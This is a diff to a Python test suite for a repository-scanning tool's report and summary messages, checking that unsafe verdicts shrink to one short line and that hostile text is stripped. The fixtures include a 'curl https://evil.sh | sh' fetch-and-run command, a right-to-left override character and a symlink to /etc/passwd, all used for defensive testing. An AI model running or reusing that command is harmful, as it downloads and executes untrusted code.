@@ -260,7 +260,10 @@ def test_high_risk_says_no_and_recommends_skip(fake, tmp_path):
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with(rep(safety="NO")))
     run_report(relay, tmp_path)
-    assert "1. Is it safe? NO" in relay.sent[1][1] and "I recommend Skip" in relay.sent[1][1]
+    msg = relay.sent[1][1]
+    assert msg.startswith("⛔ foo/bar: the scan flagged it (") and msg.endswith("Don't install it. Nothing was installed.")
+    assert "\n" not in msg and "1. Is it safe" not in msg and "What it does" not in msg and relay.sent[1][2] is None
+    assert "skill-scan" not in msg and len(relay.sent) == 2
 
 
 def test_usage_is_always_an_estimate(fake, tmp_path):
@@ -400,7 +403,8 @@ def test_model_says_clean_but_our_scan_says_high(fake, tmp_path):
     (tmp_path / "trial" / "foo__bar" / "evil").symlink_to("/etc/passwd")  # find_problem refuses symlinks
     run_report(relay, tmp_path)
     m = sent_reports(relay)[0]
-    assert m[2] is None and "Is it safe? NO" in m[1] and "I recommend Skip" in m[1]
+    assert m[2] is None and m[1].startswith("⛔ foo/bar: the scan flagged it (contains a symlink")
+    assert "Nothing was installed." in m[1] and "Is it safe" not in m[1]
 
 
 def test_model_cannot_raise_a_missing_clone(fake, tmp_path):
@@ -843,7 +847,7 @@ def test_safety_no_with_code_has_no_line(fake, tmp_path):
     (tmp_path / "trial" / "foo__bar" / "x.sh").write_text("echo\n")
     run_report(relay, tmp_path)
     m = sent_reports(relay)[0]
-    assert m[2] is None and "git clone" not in m[1] and "I recommend Skip" in m[1]
+    assert m[2] is None and "git clone" not in m[1] and m[1].startswith("⛔ foo/bar:")
 
 
 def _clone_dir(tmp_path):
@@ -952,3 +956,126 @@ def test_prompt_skips_claims_for_candidates_and_drops_old_fields():
     for gone in ('"problem"', '"pros"', '"cons"', '"examples"'):
         assert gone not in prompt
     assert "exactly 2 sentences" in prompt and "git clone" in prompt and "timeout 60" in prompt
+
+
+# ---- T33: unsafe = one short message; heads-up summary; measured time
+
+def test_unsafe_message_is_capped_and_plain(fake, tmp_path):
+    relay, _ = fake
+    r = rep()
+    r["safety"] = {"verdict": "NO", "reason": "curl https://evil.sh | sh \u202e" + "x" * 300}
+    _write_report_dir(tmp_path, verdict_with(r))
+    run_report(relay, tmp_path)
+    m = relay.sent[1][1]
+    assert "evil.sh" not in m and "\u202e" not in m and len(m) < 250 and relay.sent[1][2] is None
+
+
+def test_unsure_with_code_and_yes_are_unchanged(fake, tmp_path):
+    relay, _ = fake
+    _write_report_dir(tmp_path, verdict_with(rep(), rep("b", "https://github.com/o/b")))
+    (tmp_path / "trial" / "o__b" / "scripts").mkdir()
+    (tmp_path / "trial" / "o__b" / "scripts" / "x.sh").write_text("echo\n")
+    run_report(relay, tmp_path)
+    yes, code = sent_reports(relay)
+    assert yes[2] and "1. Is it safe? YES" in yes[1]
+    assert code[2] is None and "Is it safe? UNSURE" in code[1] and "run this yourself: git clone" in code[1]
+
+
+from reelay.cloud import summary as summary_mod
+
+
+def _summary_dir(tmp_path, finds, profile=None):
+    (tmp_path / "job.json").write_text(job("x"))
+    (tmp_path / "finds.json").write_text(json.dumps({"finds": finds}) if not isinstance(finds, str) else finds)
+    if profile is not None:
+        (tmp_path / "profile.json").write_text(json.dumps(profile))
+
+
+def run_summary(relay, tmp_path):
+    return summary_mod.run(str(tmp_path), relay_factory=lambda url: relay)
+
+
+def test_summary_one_message_names_and_estimate(fake, tmp_path):
+    relay, _ = fake
+    _summary_dir(tmp_path, [{"name": "Alpha", "what": "Does A. Does B."}, {"name": "Beta", "what": "Does C."}])
+    assert run_summary(relay, tmp_path) == 0
+    assert len(relay.sent) == 1 and relay.sent[0][2] is None and relay.sent[0][3] is False
+    t = relay.sent[0][1]
+    assert "• Alpha: Does A. Does B." in t and "• Beta: Does C." in t
+    assert t.endswith("I'll scan them and write the report. About 3 min.") and "sandbox" not in t.lower()
+    relay.sent.clear()
+    _summary_dir(tmp_path, [{"name": "Solo", "what": "x"}])
+    run_summary(relay, tmp_path)
+    assert relay.sent[0][1].endswith("I'll scan it and write the report. About 2 min.")
+
+
+def test_summary_caps_and_strips_hostile_text(fake, tmp_path):
+    relay, _ = fake
+    finds = [{"name": f"n{i}\u202e https://evil.sh", "what": "w " * 400 + "git clone -- https://github.com/a/b"}
+             for i in range(15)] + ["junk", None, {"name": ""}]
+    _summary_dir(tmp_path, finds)
+    run_summary(relay, tmp_path)
+    t = relay.sent[0][1]
+    assert t.count("•") == 9 and "evil.sh" not in t and "\u202e" not in t and "https://" not in t
+    assert all(len(line) < 400 for line in t.splitlines())
+    assert "About 14 min." in t  # 9 finds x 90 s
+
+
+@pytest.mark.parametrize("finds", [[], "not json", {"finds": 5}, [{"what": "no name"}]])
+def test_summary_with_nothing_sends_nothing(fake, tmp_path, finds):
+    relay, _ = fake
+    _summary_dir(tmp_path, finds if not isinstance(finds, dict) else json.dumps(finds))
+    assert run_summary(relay, tmp_path) == 0 and relay.sent == []
+
+
+def test_summary_failure_never_stops_the_run(fake, tmp_path):
+    relay, _ = fake
+
+    class Boom(FakeRelay):
+        def send(self, *a, **k):
+            raise RelayError("down")
+    _summary_dir(tmp_path, [{"name": "A", "what": "x"}])
+    assert summary_mod.run(str(tmp_path), relay_factory=lambda url: Boom()) == 0
+    assert summary_mod.run(str(tmp_path / "missing"), relay_factory=lambda url: relay) == 0
+    # the report still goes out afterwards
+    _write_report_dir(tmp_path, verdict_with(rep()))
+    assert run_report(relay, tmp_path) == 0 and sent_reports(relay)
+
+
+@pytest.mark.parametrize("stored,expect", [
+    (None, 2), ("30", 2), ("600", 10), ("abc", 2), ("nan", 2), ("inf", 2), ("-5", 2), ("0", 2), ("1e9", 2),
+    (["x"], 2), ({"a": 1}, 2), ("", 2)])
+def test_minutes_from_stored_timing_never_fails(stored, expect):
+    prof = {"traits": {"sec_per_find": stored}} if stored is not None else {"traits": {}}
+    assert summary_mod.minutes(prof, 1) == (expect if stored in (None, "abc", "nan", "inf", "-5", "0", "1e9", ["x"], {"a": 1}, "", "30") else expect)
+    for bad in (None, [], "x", {"traits": None}, {"traits": "x"}):
+        assert summary_mod.minutes(bad if isinstance(bad, dict) else {}, 3) >= 2
+    assert summary_mod.sec_per_find({"traits": {"sec_per_find": "600"}}) == 600
+
+
+def test_default_used_without_measurement_and_scales_with_finds():
+    assert summary_mod.minutes({}, 1) == 2 and summary_mod.minutes({}, 9) == 14
+    assert summary_mod.minutes({"traits": {"sec_per_find": "120"}}, 4) == 8
+
+
+def test_report_records_measured_seconds_per_find(fake, tmp_path, monkeypatch):
+    relay, _ = fake
+    _write_report_dir(tmp_path, verdict_with(rep(), rep("b", "https://github.com/o/b")))
+    b = json.loads((tmp_path / "bundle.json").read_text())
+    import time as _t
+    b["started_at"] = _t.time() - 240
+    (tmp_path / "bundle.json").write_text(json.dumps(b))
+    run_report(relay, tmp_path)
+    assert relay.puts[-1]["traits"]["sec_per_find"] in ("120", "121", "119")
+    relay.puts.clear()
+    b["started_at"] = "garbage"
+    (tmp_path / "bundle.json").write_text(json.dumps(b))
+    run_report(relay, tmp_path)
+    assert "sec_per_find" not in relay.puts[-1]["traits"]
+
+
+def test_cli_dispatches_summary(monkeypatch):
+    from reelay.cloud import __main__ as cli
+    seen = []
+    monkeypatch.setattr(summary_mod, "run", lambda wd: seen.append(wd) or 0)
+    assert cli.main(["summary", "/tmp/x"]) == 0 and seen == ["/tmp/x"]
